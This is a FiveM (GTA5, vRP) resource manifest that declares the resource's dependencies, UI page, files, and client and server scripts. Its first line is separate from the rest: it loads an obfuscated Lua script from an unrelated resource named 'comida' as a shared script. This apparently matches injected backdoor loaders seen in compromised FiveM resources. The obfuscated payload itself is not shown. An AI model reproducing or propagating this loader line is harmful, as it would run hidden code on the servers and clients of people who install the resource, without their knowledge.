shared_script '@comida/ai_module_fg-obfuscated.lua'
fx_version 'adamant' 
game 'gta5'
dependencies {
	'vrp',
}
ui_page 'html/index.html'
files {
	'html/**/*',
	'html/*'
}
client_script {
	"@vrp/lib/utils.lua",
	"client.lua"
}
server_scripts{ 
	"@vrp/lib/utils.lua",
	"server.lua"
}
                            